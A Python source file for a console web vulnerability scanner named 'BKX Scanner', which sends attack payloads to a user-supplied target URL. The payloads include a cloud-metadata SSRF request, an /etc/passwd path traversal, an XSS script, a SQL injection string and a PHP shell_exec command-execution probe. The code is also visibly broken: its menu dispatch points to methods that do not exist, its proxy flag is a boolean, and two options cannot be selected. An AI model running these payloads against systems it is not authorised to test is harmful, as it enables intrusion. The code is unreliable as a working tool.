import asyncio
import curses
import aiohttp
from urllib.parse import urljoin, urlparse, parse_qs
import os
from shodan import Shodan

# ASCII LOGO BK
LOGO = """
██████╗ ██╗  ██╗
██╔══██╗██║  ██║
██████╔╝███████║
██╔═══╝ ██╔══██║
██║     ██║  ██║
╚═╝     ╚═╝  ╚═╝
"""

FEATURES = {
    "1": "Security Headers",
    "2": "IDOR",
    "3": "SSRF",
    "4": "Path Traversal",
    "5": "XSS",
    "6": "SQL Injection",
    "7": "RCE",
    "8": "Shodan Scan",
    "9": "Hidden Directories",
    "10": "Sensitive Files",
    "11": "Exit"
}

class BKXScanner:
    def __init__(self, target_url, shodan_api_key=None, proxy=None):
        self.target_url = target_url.rstrip("/")
        self.shodan_api_key = shodan_api_key
        self.proxy = proxy

    async def check_security_headers(self):
        """Check Security Headers"""
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(self.target_url, proxy=self.proxy) as response:
                    headers = response.headers
                    missing_headers = [
                        h for h in [
                            "Content-Security-Policy",
                            "X-Frame-Options",
                            "X-Content-Type-Options",
                            "Strict-Transport-Security",
                            "Referrer-Policy",
                        ] if h not in headers
                    ]
                    return f"Missing Headers: {missing_headers}" if missing_headers else "All security headers present."
            except Exception as e:
                return f"Error: {str(e)}"

    async def scan_idor(self):
        """Check for IDOR"""
        params = self.extract_params(self.target_url)
        return f"Possible IDOR parameters: {params}" if params else "No parameters found."

    async def scan_ssrf(self):
        """Check for SSRF"""
        payload = "http://169.254.169.254/latest/meta-data/"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(urljoin(self.target_url, payload), proxy=self.proxy) as response:
                    return "SSRF detected!" if response.status == 200 else "No SSRF found."
            except Exception as e:
                return f"Error: {str(e)}"

    async def scan_path_traversal(self):
        """Check for Path Traversal"""
        async with aiohttp.ClientSession() as session:
            test_url = f"{self.target_url}/../../etc/passwd"
            try:
                async with session.get(test_url, proxy=self.proxy) as response:
                    return "Path Traversal detected!" if "root:" in await response.text() else "No Path Traversal found."
            except Exception as e:
                return f"Error: {str(e)}"

    async def scan_xss(self):
        """Check for XSS"""
        payload = "<script>alert('XSS')</script>"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(f"{self.target_url}?search={payload}", proxy=self.proxy) as response:
                    return "XSS detected!" if payload in await response.text() else "No XSS found."
            except Exception as e:
                return f"Error: {str(e)}"

    async def scan_sql_injection(self):
        """Check for SQL Injection"""
        payload = "' OR 1=1 --"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(f"{self.target_url}?id={payload}", proxy=self.proxy) as response:
                    return "SQL Injection detected!" if "error" in await response.text().lower() else "No SQL Injection found."
            except Exception as e:
                return f"Error: {str(e)}"

    async def scan_rce(self):
        """Check for RCE"""
        payload = "<?php echo shell_exec('id'); ?>"
        async with aiohttp.ClientSession() as session:
            try:
                async with session.get(f"{self.target_url}/upload.php?file={payload}", proxy=self.proxy) as response:
                    return "RCE detected!" if "uid=" in await response.text() else "No RCE found."
            except Exception as e:
                return f"Error: {str(e)}"

    async def shodan_scan(self):
        """Shodan Scan"""
        if not self.shodan_api_key:
            return "No Shodan API key provided."
        try:
            api = Shodan(self.shodan_api_key)
            target_ip = urlparse(self.target_url).netloc
            results = api.host(target_ip)
            return f"Shodan Results:\n{results}"
        except Exception as e:
            return f"Error: {str(e)}"

    async def scan_hidden_directories(self):
        """Scan Hidden Directories"""
        wordlist = ["admin", "backup", "hidden", "test"]
        found = []
        async with aiohttp.ClientSession() as session:
            for dir in wordlist:
                test_url = f"{self.target_url}/{dir}"
                try:
                    async with session.get(test_url, proxy=self.proxy) as response:
                        if response.status == 200:
                            found.append(test_url)
                except Exception as e:
                    return f"Error: {str(e)}"
        return f"Hidden directories found: {found}" if found else "No hidden directories found."

    async def scan_sensitive_files(self):
        """Check Sensitive Files"""
        files = ["/robots.txt", "/.git/"]
        found = []
        async with aiohttp.ClientSession() as session:
            for file in files:
                test_url = f"{self.target_url}{file}"
                try:
                    async with session.get(test_url, proxy=self.proxy) as response:
                        if response.status == 200:
                            found.append(test_url)
                except Exception as e:
                    return f"Error: {str(e)}"
        return f"Sensitive files found: {found}" if found else "No sensitive files found."

    def extract_params(self, url):
        """Extract URL Parameters"""
        parsed_url = urlparse(url)
        query = parse_qs(parsed_url.query)
        return list(query.keys())

async def user_interface(stdscr):
    """Console User Interface"""
    curses.curs_set(0)
    stdscr.clear()
    stdscr.refresh()

    stdscr.addstr(1, 5, LOGO, curses.A_BOLD)
    stdscr.addstr(10, 5, "BKX Scanner Tools:", curses.A_UNDERLINE)

    row = 12
    for key, feature in FEATURES.items():
        stdscr.addstr(row, 7, f"[{key}] {feature}")
        row += 1

    stdscr.addstr(row + 2, 5, "Select an option:")
    stdscr.refresh()

    while True:
        key = stdscr.getch()
        key = chr(key)
        if key in FEATURES:
            return key

def main():
    target_url = input("Enter target URL: ")
    shodan_key = os.getenv("SHODAN_API_KEY")
    proxy = input("Use proxy? (yes/no): ").strip().lower() == "yes"
    scanner = BKXScanner(target_url, shodan_api_key=shodan_key, proxy=proxy)

    while True:
        choice = curses.wrapper(user_interface)
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        task = getattr(scanner, f"scan_{FEATURES[choice].lower().replace(' ', '_')}", None)
        result = loop.run_until_complete(task()) if task else "Invalid option!"
        print(f"\n[Result]: {result}\n")

if __name__ == "__main__":
    main()
